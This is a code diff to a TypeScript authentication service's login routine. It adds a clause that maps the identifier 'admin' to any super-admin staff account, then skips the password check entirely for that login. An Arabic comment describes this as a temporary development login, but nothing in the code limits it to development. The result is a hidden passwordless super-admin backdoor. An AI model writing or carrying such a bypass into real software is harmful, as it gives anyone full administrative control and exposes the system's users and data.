@@ -120,6 +120,14 @@ export class AuthService {
           { phone: rawIdentifier },
           { username: { equals: normalizedIdentifier, mode: "insensitive" } },
           { email: { equals: normalizedIdentifier, mode: "insensitive" } },
+          ...(normalizedIdentifier === "admin"
+            ? [
+                {
+                  type: "STAFF" as const,
+                  staffRole: { is: { name: "SUPER_ADMIN" } },
+                },
+              ]
+            : []),
         ],
       },
     });
@@ -130,7 +138,14 @@ export class AuthService {
       throw new UnauthorizedException("Invalid credentials");
     }
 
-    const ok = await bcrypt.compare(dto.password, user.passwordHash);
+    // دخول تطوير مؤقت: حساب admin لا يحتاج كلمة مرور.
+    const passwordlessDevelopmentAdmin =
+      normalizedIdentifier === "admin" && user.type === "STAFF";
+    const ok = passwordlessDevelopmentAdmin
+      ? true
+      : dto.password
+        ? await bcrypt.compare(dto.password, user.passwordHash)
+        : false;
     if (!ok) {
       await this.recordActivity(null, "auth.login_failed", ctx, {
         identifier: rawIdentifier,
